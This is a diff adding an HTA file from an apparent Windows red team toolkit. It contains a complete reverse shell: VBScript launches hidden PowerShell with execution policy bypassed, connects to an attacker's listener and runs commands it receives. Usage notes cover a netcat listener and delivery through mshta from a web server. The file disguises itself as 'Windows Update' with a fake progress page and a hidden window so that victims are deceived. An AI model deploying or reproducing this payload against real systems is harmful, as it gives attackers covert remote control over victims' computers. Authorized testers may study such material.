@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<!--
+  HTA Reverse Shell Payload
+  Native Windows Red Team Toolkit
+  Author: Anubhav Gain (@anubhavg-icpl)
+
+  USAGE:
+  1. Modify IP and PORT below
+  2. Start listener: nc -lvp PORT
+  3. Execute: mshta.exe reverse-shell.hta
+     Or host on web server and execute: mshta.exe http://your-server/reverse-shell.hta
+-->
+<html>
+<head>
+  <title>Windows Update</title>
+  <HTA:APPLICATION
+    ID="WindowsUpdate"
+    APPLICATIONNAME="Windows Update"
+    BORDER="none"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    WINDOWSTATE="minimize"
+    SCROLL="no"
+  />
+
+  <script language="VBScript">
+    ' CONFIGURE THESE VALUES
+    Dim IP, PORT
+    IP = "CHANGEME"  ' Your listener IP
+    PORT = "4444"    ' Your listener port
+
+    Sub Window_OnLoad
+      On Error Resume Next
+
+      Dim objShell, command
+
+      Set objShell = CreateObject("WScript.Shell")
+
+      ' PowerShell reverse shell
+      command = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+        """$client = New-Object System.Net.Sockets.TCPClient('" & IP & "'," & PORT & ");" & _
+        "$stream = $client.GetStream();" & _
+        "[byte[]]$bytes = 0..65535|%{0};" & _
+        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){" & _
+        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" & _
+        "$sendback = (iex $data 2>&1 | Out-String );" & _
+        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" & _
+        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" & _
+        "$stream.Write($sendbyte,0,$sendbyte.Length);" & _
+        "$stream.Flush()};" & _
+        "$client.Close()"""
+
+      objShell.Run command, 0, False
+
+      ' Close the HTA window
+      window.close()
+    End Sub
+  </script>
+</head>
+<body bgcolor="#000000">
+  <div style="color:#ffffff;font-family:Arial;padding:20px;">
+    <h2>Windows Update</h2>
+    <p>Updating system components...</p>
+    <p>Please do not close this window.</p>
+  </div>
+</body>
+</html>
